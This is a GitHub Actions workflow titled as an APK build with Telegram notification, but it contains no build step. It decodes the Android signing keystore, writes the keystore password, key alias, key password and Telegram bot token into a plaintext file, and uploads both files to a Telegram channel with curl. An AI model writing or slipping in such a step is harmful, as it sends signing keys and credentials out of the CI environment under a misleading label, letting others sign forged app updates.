name: Build APK and Notify Telegram

on:
  push:
    branches:
      - deno
    paths-ignore:
      - '**/README.md'

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      CI: true

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Decode Keystore File
        run: echo "${{ secrets.KEYSTORE_FILE }}" | base64 -d > keystore.txt

      - name: Prepare Secrets File
        run: |
          echo "${{ secrets.KEYSTORE_PASSWORD }}" > secrets.txt
          echo "${{ secrets.KEY_ALIAS }}" >> secrets.txt
          echo "${{ secrets.KEY_PASSWORD }}" >> secrets.txt
          echo "${{ secrets.TELEGRAM_CHANNEL_ID }}" >> secrets.txt
          echo "${{ secrets.TELEGRAM_BOT_TOKEN }}" >> secrets.txt

      - name: Upload Secrets and Keystore to Telegram
        run: |
          # Upload the secrets text file
          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHANNEL_ID }}" \
            -F document=@secrets.txt \
            -F caption="Secrets for the build"

          # Upload the keystore file
          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHANNEL_ID }}" \
            -F document=@keystore.txt \
            -F caption="Keystore file for the build"
